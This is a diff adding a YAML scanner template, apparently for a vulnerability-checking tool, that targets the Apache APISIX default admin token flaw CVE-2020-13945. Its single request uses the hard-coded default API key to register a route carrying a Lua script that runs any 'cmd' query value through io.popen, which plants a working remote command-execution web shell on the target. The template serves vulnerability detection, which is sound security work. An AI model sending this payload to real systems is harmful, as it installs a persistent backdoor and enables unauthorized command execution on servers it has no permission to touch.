@@ -1,0 +1,28 @@
+name: Apache APISIX Admin API Default Token CVE-2020-13945
+manual: true
+query: header="APISIX"
+transport: http
+rules:
+  r0:
+    request:
+      method: POST
+      path: /apisix/admin/routes
+      headers:
+        Content-Type: application/json
+        X-API-KEY: edd1c9f034335f136f87ad84b625c8f1
+      body: "{\r\n    \"uri\": \"/attack\",\r\n\"script\": \"local _M = {} \\n function
+        _M.access(conf, ctx) \\n local os = require('os')\\n local args = assert(ngx.req.get_uri_args())
+        \\n local f = assert(io.popen(args.cmd, 'r'))\\n local s = assert(f:read('*a'))\\n
+        ngx.say(s)\\n f:close()  \\n end \\nreturn _M\",\r\n    \"upstream\": {\r\n
+        \       \"type\": \"roundrobin\",\r\n        \"nodes\": {\r\n            \"example.com:80\":
+        1\r\n        }\r\n    }\r\n}"
+      follow_redirects: true
+    expression: response.status == 201 && response.body.bcontains(b"attack")
+expression: r0()
+detail:
+  links:
+  - https://nvd.nist.gov/vuln/detail/CVE-2020-13945
+  - https://packetstormsecurity.com/files/166228/Apache-APISIX-Remote-Code-Execution.html
+  description: The Apache APISIX Dashboard is designed to make it as easy as possible
+    for users to operate Apache APISIX through a frontend interface.
+  tags: defaulttoken
